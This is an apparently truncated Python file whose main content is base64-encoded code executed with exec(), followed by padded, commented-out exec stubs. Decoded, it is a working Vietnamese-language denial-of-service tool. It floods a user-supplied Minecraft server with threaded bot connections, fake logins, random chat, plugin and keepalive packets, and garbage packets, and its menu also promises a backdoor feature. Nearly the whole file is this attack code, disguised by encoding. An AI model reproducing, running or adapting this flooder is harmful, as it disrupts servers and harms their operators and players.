GVhcl9zY3JlZW4oKQogICAgICAgICAgICBwcmludChmIntDb2xvcnMuV0FSTklOR31Uw61uaCBuxINuZyBCYWNrZG9vciDEkWFuZyB0cm9uZyBxdcOhIHRyw6xuaCBwaMOhdCB0cmnhu4NuIHbDoCBjaMawYSBraOG6oyBk4bulbmcue0NvbG9ycy5FTkRDfSIpCiAgICAgICAgICAgIHdhaXRfZm9yX3JldHVybigpCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjQiOgogICAgICAgICAgICBjbGVhcl9zY3JlZW4oKQogICAgICAgICAgICBpcCA9IGlucHV0KGYie0NvbG9ycy5CT0xEfU5o4bqtcCBJUCBzZXJ2ZXIgTWluZWNyYWZ0OiB7Q29sb3JzLkVOREN9Iikuc3RyaXAoKQogICAgICAgICAgICBwb3J0X3N0ciA9IGlucHV0KGYie0NvbG9ycy5CT0xEfU5o4bqtcCBQb3J0ICht4bq3YyDEkeG7i25oIDI1NTY1KToge0NvbG9ycy5FTkRDfSIpLnN0cmlwKCkKICAgICAgICAgICAgcG9ydCA9IGludChwb3J0X3N0cikgaWYgcG9ydF9zdHIuaXNkaWdpdCgpIGVsc2UgMjU1NjUKICAgICAgICAgICAgaWYgbm90IGNoZWNrX3NlcnZlcihpcCwgcG9ydCk6CiAgICAgICAgICAgICAgICBwcmludChmIntDb2xvcnMuRkFJTH1LaMO0bmcgdGjhu4Mga+G6v3QgbuG7kWkgdOG7m2kgc2VydmVyIHtpcH06e3BvcnR9LiBWdWkgbMOybmcga2nhu4NtIHRyYSBs4bqhaSBJUCBob+G6t2MgUG9ydC57Q29sb3JzLkVOREN9IikKICAgICAgICAgICAgICAgIHdhaXRfZm9yX3JldHVybigpCiAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICBwYWNrZXRzX3N0ciA9IGlucHV0KGYie0NvbG9ycy5CT0xEfVPhu5EgbMaw4bujbmcgcGFja2V0IGfhu61pIG3hu5dpIGzhuqduICh2ZDogMTApOiB7Q29sb3JzLkVOREN9Iikuc3RyaXAoKQogICAgICAgICAgICBwYWNrZXRzID0gaW50KHBhY2tldHNfc3RyKSBpZiBwYWNrZXRzX3N0ci5pc2RpZ2l0KCkgZWxzZSAxMAogICAgICAgICAgICBkdXJhdGlvbl9zdHIgPSBpbnB1dChmIntDb2xvcnMuQk9MRH1UaOG7nWkgZ2lhbiB04bqlbiBjw7RuZyAoZ2nDonksIG5o4bqtcCAwIMSR4buDIHbDtCBo4bqhbik6IHtDb2xvcnMuRU5EQ30iKS5zdHJpcCgpCiAgICAgICAgICAgIGR1cmF0aW9uID0gaW50KGR1cmF0aW9uX3N0cikgaWYgZHVyYXRpb25fc3RyLmlzZGlnaXQoKSBlbHNlIDAKICAgICAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLldBUk5JTkd9QuG6r3QgxJHhuqd1IHThuqVuIGPDtG5nIElQIHtpcH06e3BvcnR9Li4ue0NvbG9ycy5FTkRDfSIpCiAgICAgICAgICAgIHN0YXJ0X2F0dGFjayhpcCwgcG9ydCwgcGFja2V0cywgZHVyYXRpb24pCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjAiOgogICAgICAgICAgICBwcmludChmIntDb2xvcnMuT0tCTFVFfVRob8OhdCBjaMawxqFuZyB0csOsbmguIEjhurluIGfhurdwIGzhuqFpIXtDb2xvcnMuRU5EQ30iKQogICAgICAgICAgICBicmVhawogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5GQUlMfUzhu7FhIGNo4buNbiBraMO0bmcgaOG7o3AgbOG7hy4gVnVpIGzDsm5nIHRo4butIGzhuqFpLntDb2xvcnMuRU5EQ30iKQogICAgICAgICAgICB0aW1lLnNsZWVwKDEpCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgc2hvd19tZW51KCkK').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('CmltcG9ydCBzb2NrZXQKaW1wb3J0IHRocmVhZGluZwppbXBvcnQgdGltZQppbXBvcnQgcmFuZG9tCmltcG9ydCBzdHJpbmcKaW1wb3J0IG9zCgpjbGFzcyBDb2xvcnM6CiAgICBIRUFERVIgPSAnXDAzM1s5NW0nCiAgICBPS0JMVUUgPSAnXDAzM1s5NG0nCiAgICBPS0dSRUVOID0gJ1wwMzNbOTJtJwogICAgV0FSTklORyA9ICdcMDMzWzkzbScKICAgIEZBSUwgPSAnXDAzM1s5MW0nCiAgICBJTkZPID0gJ1wwMzNbOTZtJwogICAgRU5EQyA9ICdcMDMzWzBtJwogICAgQk9MRCA9ICdcMDMzWzFtJwoKY2xhc3MgSWNvbnM6CiAgICBBUlJPVyA9ICfilronCiAgICBDSEVDSyA9ICfinJQnCiAgICBDUk9TUyA9ICfinJgnCiAgICBTVEFSID0gJ+KYhScKICAgIFdBUk5JTkcgPSAn4pigJwogICAgSU5GTyA9ICfinIknCiAgICBORVhUID0gJ+KepCcKICAgIENIRUNLQk9YID0gJ+KYkScKICAgIEJVTExFVCA9ICfinKYnCgpkZWYgY2xlYXJfc2NyZWVuKCk6CiAgICBvcy5zeXN0ZW0oJ2NscycgaWYgb3MubmFtZSA9PSAnbnQnIGVsc2UgJ2NsZWFyJykKCnN1Y2Nlc3NfY291bnQgPSAwCmZhaWxfY291bnQgPSAwCmxvY2sgPSB0aHJlYWRpbmcuTG9jaygpCgpkZWYgZW5jb2RlX3ZhcmludCh2YWx1ZSk6CiAgICByZXN1bHQgPSBiJycKICAgIHdoaWxlIFRydWU6CiAgICAgICAgdGVtcCA9IHZhbHVlICYgMHg3RgogICAgICAgIHZhbHVlID4+PSA3CiAgICAgICAgaWYgdmFsdWU6CiAgICAgICAgICAgIHRlbXAgfD0gMHg4MAogICAgICAgIHJlc3VsdCArPSBieXRlcyhbdGVtcF0pCiAgICAgICAgaWYgbm90IHZhbHVlOgogICAgICAgICAgICBicmVhawogICAgcmV0dXJuIHJlc3VsdAoKZGVmIGVuY29kZV9zdHJpbmcocyk6CiAgICBkYXRhID0gcy5lbmNvZGUoJ3V0Zi04JykKICAgIHJldHVybiBlbmNvZGVfdmFyaW50KGxlbihkYXRhKSkgKyBkYXRhCgpkZWYgc2VuZF9wYWNrZXQoc29jaywgcGFja2V0X2lkLCBkYXRhKToKICAgIHBhY2tldCA9IGJ5dGVzKFtwYWNrZXRfaWRdKSArIGRhdGEKICAgIGxlbmd0aCA9IGVuY29kZV92YXJpbnQobGVuKHBhY2tldCkpCiAgICBzb2NrLnNlbmRhbGwobGVuZ3RoICsgcGFja2V0KQoKZGVmIGdlbmVyYXRlX3VzZXJuYW1lKCk6CiAgICByZXR1cm4gIlVzZXJfIiArICcnLmpvaW4ocmFuZG9tLmNob2ljZXMoc3RyaW5nLmFzY2lpX2xvd2VyY2FzZSArIHN0cmluZy5kaWdpdHMsIGs9OCkpCgpkZWYgcmFuZG9tX2NoYXQoKToKICAgIHJldHVybiAnJy5qb2luKHJhbmRvbS5jaG9pY2VzKHN0cmluZy5hc2NpaV9sZXR0ZXJzICsgc3RyaW5nLmRpZ2l0cywgaz1yYW5kb20ucmFuZGludCg1LCAyMCkpKQoKY2xhc3MgTWl4ZWRQYWNrZXRGbG9vZGVyOgogICAgZGVmIF9faW5pdF9fKHNlbGYsIGlwLCBwb3J0LCBwYWNrZXRfaWQpOgogICAgICAgIHNlbGYuaXAgPSBpcAogICAgICAgIHNlbGYucG9ydCA9IHBvcnQKICAgICAgICBzZWxmLnBhY2tldF9pZCA9IHBhY2tldF9pZAogICAgICAgIHNlbGYuc29jayA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKCiAgICBkZWYgY29ubmVjdChzZWxmKToKICAgICAgICBzZWxmLnNvY2suc2V0dGltZW91dCgzKQogICAgICAgIHNlbGYuc29jay5jb25uZWN0KChzZWxmLmlwLCBzZWxmLnBvcnQpKQoKICAgIGRlZiBydW4oc2VsZik6CiAgICAgICAgZ2xvYmFsIHN1Y2Nlc3NfY291bnQsIGZhaWxfY291bnQKICAgICAgICB0cnk6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHNlbGYuY29ubmVjdCgpCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgICAgICBwcmludChmIntDb2xvcnMuRkFJTH3Kn+G0gOG0hOG0jeG0gMmqyoDhtIDhtJgg4bSb4bSP4bSPyp8gU0VSVkVSIE3huqRUIEvhur5UIE7hu5BJICggQ0jhur5UICl7Q29sb3JzLkVOREN9IikKICAgICAgICAgICAgICAgIHdpdGggbG9jazoKICAgICAgICAgICAgICAgICAgICBmYWlsX2NvdW50ICs9IDEKICAgICAgICAgICAgICAgIHJldHVybgoKICAgICAgICAgICAgaGFuZHNoYWtlID0gKAogICAgICAgICAgICAgICAgZW5jb2RlX3ZhcmludCg3NTQpICsKICAgICAgICAgICAgICAgIGVuY29kZV9zdHJpbmcoc2VsZi5pcCkgKwogICAgICAgICAgICAgICAgc2VsZi5wb3J0LnRvX2J5dGVzKDIsICdiaWcnKSArCiAgICAgICAgICAgICAgICBlbmNvZGVfdmFyaW50KDIpICAjIE5leHQgc3RhdGUgPSBsb2dpbgogICAgICAgICAgICApCiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgMHgwMCwgaGFuZHNoYWtlKQogICAgICAgICAgICB0aW1lLnNsZWVwKDAuMDIpCiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgMHgwMCwgZW5jb2RlX3N0cmluZyhnZW5lcmF0ZV91c2VybmFtZSgpKSkKICAgICAgICAgICAgdGltZS5zbGVlcCgwLjA1KQoKICAgICAgICAgICAgZm9yIF8gaW4gcmFuZ2UocmFuZG9tLnJhbmRpbnQoMiwgNikpOgogICAgICAgICAgICAgICAgc2VsZi5zZW5kX3JhbmRvbV9wYWNrZXQoKQoKICAgICAgICAgICAgd2l0aCBsb2NrOgogICAgICAgICAgICAgICAgc3VjY2Vzc19jb3VudCArPSAxCiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5PS0dSRUVOfcqf4bSA4bSE4bSN4bSAyarKgOG0gOG0mCDhtJvhtI/htI/KnyBbIHtzZWxmLnBhY2tldF9pZH0gXSBH4butaSBUaMOgbmggQ8O0bmcgIXtDb2xvcnMuRU5EQ30iKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5GQUlMfcqf4bSA4bSE4bSN4bSAyarKgOG0gOG0mCDhtJvhtI/htI/KnyBbIHtzZWxmLnBhY2tldF9pZH0gXSBH4butaSBUaOG6pXQgQuG6oWl7Q29sb3JzLkVOREN9IikKICAgICAgICAgICAgd2l0aCBsb2NrOgogICAgICAgICAgICAgICAgZmFpbF9jb3VudCArPSAxCiAgICAgICAgZmluYWxseToKICAgICAgICAgICAgc2VsZi5zb2NrLmNsb3NlKCkKCiAgICBkZWYgc2VuZF9yYW5kb21fcGFja2V0KHNlbGYpOgogICAgICAgIHBrdF90eXBlID0gcmFuZG9tLmNob2ljZShbImNoYXQiLCAicGx1Z2luIiwgImtlZXBhbGl2ZSIsICJjdXN0b20iXSkKCiAgICAgICAgaWYgcGt0X3R5cGUgPT0gImNoYXQiOgogICAgICAgICAgICBtc2cgPSBlbmNvZGVfc3RyaW5nKHJhbmRvbV9jaGF0KCkpCiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgMHgwMywgbXNnKQogICAgICAgIGVsaWYgcGt0X3R5cGUgPT0gInBsdWdpbiI6CiAgICAgICAgICAgIGNoYW5uZWwgPSBlbmNvZGVfc3RyaW5nKCJNQ3xCcmFuZCIpCiAgICAgICAgICAgIGRhdGEgPSBlbmNvZGVfc3RyaW5nKCJMQUMxM19DdXN0b21DbGllbnQiKQogICAgICAgICAgICBzZW5kX3BhY2tldChzZWxmLnNvY2ssIDB4MTcsIGNoYW5uZWwgKyBkYXRhKQogICAgICAgIGVsaWYgcGt0X3R5cGUgPT0gImtlZXBhbGl2ZSI6CiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgMHgyMSwgZW5jb2RlX3ZhcmludChyYW5kb20ucmFuZGludCgxMDAwMCwgOTk5OTk5KSkpCiAgICAgICAgZWxpZiBwa3RfdHlwZSA9PSAiY3VzdG9tIjoKICAgICAgICAgICAgZ2FyYmFnZSA9IGJ5dGVzKHJhbmRvbS5nZXRyYW5kYml0cyg4KSBmb3IgXyBpbiByYW5nZShyYW5kb20ucmFuZGludCgxMCwgMzApKSkKICAgICAgICAgICAgZmFrZV9pZCA9IHJhbmRvbS5yYW5kaW50KDB4MDEsIDB4M0YpCiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgZmFrZV9pZCwgZ2FyYmFnZSkKCmRlZiBzdGFydF9hdHRhY2soaXAsIHBvcnQsIHBhY2tldHNfcGVyX3JvdW5kLCBkdXJhdGlvbik6CiAgICBzdGFydF90aW1lID0gdGltZS50aW1lKCkKICAgIHBhY2tldF9pZCA9IDEKCiAgICB0cnk6CiAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgdGhyZWFkcyA9IFtdCiAgICAgICAgICAgIGZvciBfIGluIHJhbmdlKHBhY2tldHNfcGVyX3JvdW5kKToKICAgICAgICAgICAgICAgIHQgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1NaXhlZFBhY2tldEZsb29kZXIoaXAsIHBvcnQsIHBhY2tldF9pZCkucnVuKQogICAgICAgICAgICAgICAgdC5zdGFydCgpCiAgICAgICAgICAgICAgICB0aHJlYWRzLmFwcGVuZCh0KQogICAgICAgICAgICAgICAgcGFja2V0X2lkICs9IDEKICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMC4wMDIpCgogICAgICAgICAgICBmb3IgdCBpbiB0aHJlYWRzOgogICAgICAgICAgICAgICAgdC5qb2luKCkKCiAgICAgICAgICAgIGlmIGR1cmF0aW9uICE9IDAgYW5kIHRpbWUudGltZSgpIC0gc3RhcnRfdGltZSA+PSBkdXJhdGlvbjoKICAgICAgICAgICAgICAgIGJyZWFrCiAgICBleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6CiAgICAgICAgcHJpbnQoZiJcbntDb2xvcnMuV0FSTklOR33Kn+G0gOG0hOG0jeG0gMmqyoDhtIDhtJgg4bSb4bSP4bSPyp8gROG7q25nIGLhu59pIG5nxrDhu51pIGTDuW5nLntDb2xvcnMuRU5EQ30iKQogICAgZmluYWxseToKICAgICAgICBwcmludChmIlxue0NvbG9ycy5IRUFERVJ9yp/htIDhtIThtI3htIDJqsqA4bSA4bSYIOG0m+G0j+G0j8qfIFThuqROIEPDlE5HIEvhur5UIFRIw5pDe0NvbG9ycy5FTkRDfSIpCiAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLk9LR1JFRU59VGjDoG5oIGPDtG5nOiB7c3VjY2Vzc19jb3VudH17Q29sb3JzLkVOREN9IikKICAgICAgICBwcmludChmIntDb2xvcnMuRkFJTH1UaOG6pXQgYuG6oWk6IHtmYWlsX2NvdW50fXtDb2xvcnMuRU5EQ30iKQogICAgICAgIHByaW50KGYie0NvbG9ycy5JTkZPfVThu5VuZyB0aOG7nWkgZ2lhbjoge2ludCh0aW1lLnRpbWUoKSAtIHN0YXJ0X3RpbWUpfSBnacOieXtDb2xvcnMuRU5EQ30iKQogICAgICAgIHdhaXRfZm9yX3JldHVybigpCgpkZWYgd2FpdF9mb3JfcmV0dXJuKCk6CiAgICB3aGlsZSBUcnVlOgogICAgICAgIGlucCA9IGlucHV0KGYie0NvbG9ycy5CT0xEfXtJY29ucy5BUlJPV30gTmjhuq1wIDAgxJHhu4MgcXVheSBs4bqhaSBtZW51OiB7Q29sb3JzLkVOREN9Iikuc3RyaXAoKQogICAgICAgIGlmIGlucCA9PSAiMCI6CiAgICAgICAgICAgIGJyZWFrCgpkZWYgY2hlY2tfc2VydmVyKGlwLCBwb3J0KToKICAgIHRyeToKICAgICAgICB0ZXN0X3NvY2sgPSBzb2NrZXQuc29ja2V0KCkKICAgICAgICB0ZXN0X3NvY2suc2V0dGltZW91dCgzKQogICAgICAgIHRlc3Rfc29jay5jb25uZWN0KChpcCwgcG9ydCkpCiAgICAgICAgdGVzdF9zb2NrLmNsb3NlKCkKICAgICAgICByZXR1cm4gVHJ1ZQogICAgZXhjZXB0OgogICAgICAgIHJldHVybiBGYWxzZQoKZGVmIHNob3dfbWVudSgpOgogICAgd2hpbGUgVHJ1ZToKICAgICAgICBjbGVhcl9zY3JlZW4oKQogICAgICAgIHByaW50KGYie0NvbG9ycy5PS0JMVUV9e0ljb25zLlNUQVIqM30gSMOjeSBHaGkgc+G7kSDEkeG7gyBzw6BpIMqf4bSA4bSE4bSN4bSAyarKgOG0gOG0mCDhtJvhtI/htI/KnyB7SWNvbnMuU1RBUiozfXtDb2xvcnMuRU5EQ31cbiIpCiAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLk9LR1JFRU59e0ljb25zLkNIRUNLfSAxLiBIaeG7h24gU3RhdHVze0NvbG9ycy5FTkRDfSIpCiAgICAgICAgcHJpbnQoZiIgICB7Q29sb3JzLklORk99SGnhu4duIHRow7RuZyB0aW4sIGNo4bupYyBuxINuZyBj4bunYSDKn+G0gOG0hOG0jeG0gMmqyoDhtIDhtJgg4bSb4bSP4bSPyp97Q29sb3JzLkVOREN9XG4iKQogICAgICAgIHByaW50KGYie0NvbG9ycy5PS0dSRUVOfXtJY29ucy5DSEVDS0JPWH0gMi4gSGnhu4duIFRvb2xzIMSRYW5nIHPDoGl7Q29sb3JzLkVOREN9IikKICAgICAgICBwcmludChmIiAgIHtDb2xvcnMuSU5GT31IxrDhu5tuZyBk4bqrbiBjw6FjaCBz4butIGThu6VuZyB0b29sIGRvcyBj4bunYSDKn+G0gOG0hOG0jeG0gMmqyoDhtIDhtJgg4bSb4bSP4bSPyp97Q29sb3JzLkVOREN9XG4iKQogICAgICAgIHByaW50KGYie0NvbG9ycy5XQVJOSU5HfXtJY29ucy5XQVJOSU5HfSAzLiBIaeG7h24gVG9vbHMgQmFja2Rvb3IgKENvbWluZyBzb29uKXtDb2xvcnMuRU5EQ30iKQogICAgICAgIHByaW50KGYiICAge0NvbG9ycy5JTkZPfVTDrW5oIG7Eg25nIEJhY2tkb29yIGhp4buHbiBjaMawYSBraOG6oyBk4bulbmcsIHPhur0gY+G6rXAgbmjhuq10IHNhdXtDb2xvcnMuRU5EQ31cbiIpCiAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLkZBSUx9e0ljb25zLkNST1NTfSA0LiBU4bqlbiBDw7RuZyBJcHtDb2xvcnMuRU5EQ30iKQogICAgICAgIHByaW50KGYiICAge0NvbG9ycy5JTkZPfUto4bufaSDEkeG7mW5nIGNo4bupYyBuxINuZyB04bqlbiBjw7RuZyBn4butaSBwYWNrZXQgxJHhur9uIElQIHNlcnZlciDEkcOjIG5o4bqtcHtDb2xvcnMuRU5EQ31cbiIpCiAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLkhFQURFUn17SWNvbnMuTkVYVH0gMC4gVGhvw6F0e0NvbG9ycy5FTkRDfVxuIikKCiAgICAgICAgY2hvaWNlID0gaW5wdXQoZiJ7Q29sb3JzLkJPTER9e0ljb25zLkFSUk9XfSBDaOG7jW46IHtDb2xvcnMuRU5EQ30iKS5zdHJpcCgpCgogICAgICAgIGlmIGNob2ljZSA9PSAiMSI6CiAgICAgICAgICAgIGNsZWFyX3NjcmVlbigpCiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5PS0dSRUVOfcqf4bSA4bSE4bSN4bSAyarKgOG0gOG0mCDhtJvhtI/htI/KnyBsw6AgY8O0bmcgY+G7pSBn4butaSBwYWNrZXQgaOG7l24gaOG7o3AgTWluZWNyYWZ0IMSR4buDIGtp4buDbSB0cmEga2jhuqMgbsSDbmcgY2jhu4t1IHThuqNpIHNlcnZlci57Q29sb3JzLkVOREN9IikKICAgICAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLklORk99SOG7lyB0cuG7oyBuaGnhu4F1IGxv4bqhaSBwYWNrZXQgbmjGsCBjaGF0LCBwbHVnaW4sIGtlZXBhbGl2ZSwgY3VzdG9tLCB2LnYue0NvbG9ycy5FTkRDfSIpCiAgICAgICAgICAgIHdhaXRfZm9yX3JldHVybigpCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjIiOgogICAgICAgICAgICBjbGVhcl9zY3JlZW4oKQogICAgICAgICAgICBwcmludChmIntDb2xvcnMuT0tHUkVFTn1Ub29scyDEkWFuZyBzw6BpOntDb2xvcnMuRU5EQ30iKQogICAgICAgICAgICBwcmludChmIiAtIEfhu61pIHBhY2tldCBoYW5kc2hha2UiKQogICAgICAgICAgICBwcmludChmIiAtIEfhu61pIHBhY2tldCBsb2dpbiBzdGFydCIpCiAgICAgICAgICAgIHByaW50KGYiIC0gR+G7rWkgcGFja2V0IGNoYXQsIHBsdWdpbiwga2VlcGFsaXZlLCBjdXN0b20gbmfhuqt1IG5oacOqbiIpCiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5JTkZPfULhuqFuIGPDsyB0aOG7gyB0w7l5IGNo4buNbiBz4buRIGzGsOG7o25nIHBhY2tldCBn4butaSB2w6AgdGjhu51pIGdpYW4gdOG6pW4gY8O0bmcue0NvbG9ycy5FTkRDfSIpCiAgICAgICAgICAgIHdhaXRfZm9yX3JldHVybigpCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjMiOgogICAgICAgICAgICBjbGVhcl9zY3JlZW4oKQogICAgICAgICAgICBwcmludChmIntDb2xvcnMuV0FSTklOR31Uw61uaCBuxINuZyBCYWNrZG9vciDEkWFuZyB0cm9uZyBxdcOhIHRyw6xuaCBwaMOhdCB0cmnhu4NuIHbDoCBjaMawYSBraOG6oyBk4bulbmcue0NvbG9ycy5FTkRDfSIpCiAgICAgICAgICAgIHdhaXRfZm9yX3JldHVybigpCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjQiOgogICAgICAgICAgICBjbGVhcl9zY3JlZW4oKQogICAgICAgICAgICBpcCA9IGlucHV0KGYie0NvbG9ycy5CT0xEfU5o4bqtcCBJUCBzZXJ2ZXIgTWluZWNyYWZ0OiB7Q29sb3JzLkVOREN9Iikuc3RyaXAoKQogICAgICAgICAgICBwb3J0X3N0ciA9IGlucHV0KGYie0NvbG9ycy5CT0xEfU5o4bqtcCBQb3J0ICht4bq3YyDEkeG7i25oIDI1NTY1KToge0NvbG9ycy5FTkRDfSIpLnN0cmlwKCkKICAgICAgICAgICAgcG9ydCA9IGludChwb3J0X3N0cikgaWYgcG9ydF9zdHIuaXNkaWdpdCgpIGVsc2UgMjU1NjUKICAgICAgICAgICAgaWYgbm90IGNoZWNrX3NlcnZlcihpcCwgcG9ydCk6CiAgICAgICAgICAgICAgICBwcmludChmIntDb2xvcnMuRkFJTH1LaMO0bmcgdGjhu4Mga+G6v3QgbuG7kWkgdOG7m2kgc2VydmVyIHtpcH06e3BvcnR9LiBWdWkgbMOybmcga2nhu4NtIHRyYSBs4bqhaSBJUCBob+G6t2MgUG9ydC57Q29sb3JzLkVOREN9IikKICAgICAgICAgICAgICAgIHdhaXRfZm9yX3JldHVybigpCiAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICBwYWNrZXRzX3N0ciA9IGlucHV0KGYie0NvbG9ycy5CT0xEfVPhu5EgbMaw4bujbmcgcGFja2V0IGfhu61pIG3hu5dpIGzhuqduICh2ZDogMTApOiB7Q29sb3JzLkVOREN9Iikuc3RyaXAoKQogICAgICAgICAgICBwYWNrZXRzID0gaW50KHBhY2tldHNfc3RyKSBpZiBwYWNrZXRzX3N0ci5pc2RpZ2l0KCkgZWxzZSAxMAogICAgICAgICAgICBkdXJhdGlvbl9zdHIgPSBpbnB1dChmIntDb2xvcnMuQk9MRH1UaOG7nWkgZ2lhbiB04bqlbiBjw7RuZyAoZ2nDonksIG5o4bqtcCAwIMSR4buDIHbDtCBo4bqhbik6IHtDb2xvcnMuRU5EQ30iKS5zdHJpcCgpCiAgICAgICAgICAgIGR1cmF0aW9uID0gaW50KGR1cmF0aW9uX3N0cikgaWYgZHVyYXRpb25fc3RyLmlzZGlnaXQoKSBlbHNlIDAKICAgICAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLldBUk5JTkd9QuG6r3QgxJHhuqd1IHThuqVuIGPDtG5nIElQIHtpcH06e3BvcnR9Li4ue0NvbG9ycy5FTkRDfSIpCiAgICAgICAgICAgIHN0YXJ0X2F0dGFjayhpcCwgcG9ydCwgcGFja2V0cywgZHVyYXRpb24pCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjAiOgogICAgICAgICAgICBwcmludChmIntDb2xvcnMuT0tCTFVFfVRob8OhdCBjaMawxqFuZyB0csOsbmguIEjhurluIGfhurdwIGzhuqFpIXtDb2xvcnMuRU5EQ30iKQogICAgICAgICAgICBicmVhawogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5GQUlMfUzhu7FhIGNo4buNbiBraMO0bmcgaOG7o3AgbOG7hy4gVnVpIGzDsm5nIHRo4butIGzhuqFpLntDb2xvcnMuRU5EQ30iKQogICAgICAgICAgICB0aW1lLnNsZWVwKDEpCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgc2hvd19tZW51KCkK').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
